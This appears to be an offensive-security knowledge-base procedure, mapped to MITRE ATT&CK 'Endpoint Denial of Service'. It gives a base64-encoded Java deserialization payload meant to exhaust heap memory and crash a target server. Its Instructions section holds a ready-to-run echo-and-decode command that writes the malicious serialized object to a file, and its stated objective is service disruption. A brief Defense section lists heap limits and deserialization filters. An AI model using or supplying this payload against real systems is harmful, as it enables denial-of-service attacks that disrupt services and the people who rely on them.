---
id: proc-generate-dos-payload
tags:
  - dos
  - payload
  - memory-exhaustion
type: procedure
tools:
  - '[[tools/base64]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/echo-decode-dos-payload]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T17:23:27.704Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
---
# Generate-DoS-Deserialization-Payload

## Summary

This procedure decodes a base64-encoded Java deserialization payload designed to cause infinite object creation, leading to OutOfMemoryError and DoS on the target server.

## Description

The payload exploits recursive deserialization to exhaust Java heap space. It's provided as base64 to embed in reports or scripts. Echo pipes to base64 decoder, outputting binary. Use in PoC only to avoid real disruption. Requires base64 utility available.

## Requirements

1. Base64 utility installed
2. Write permissions for output file

## Defense

Defensive measures and detection strategies:

- Limit heap size and monitor JVM memory usage
- Use deserialization filters to block recursive gadgets
- Alert on rapid memory spikes in application logs

## Objectives

1. Decode the DoS payload
2. Prepare for transmission
3. Enable service disruption via memory exhaustion

## Instructions

### Step 1: Decode Base64 Payload

**Context**: Use echo to output the encoded string and pipe to base64 decoder.

**Command** ([[commands/echo-decode-dos-payload]]):
```bash
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

> Decodes to binary; expected output is 'payload_dos' file with the malicious serialized object (~100 bytes).

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[Endpoint Denial of Service]]

### Sub-Techniques


## Commands Used

- [[commands/echo-decode-dos-payload]]

## Tools Used

- [[tools/base64]]

## Tags

- dos
- payload
- memory-exhaustion
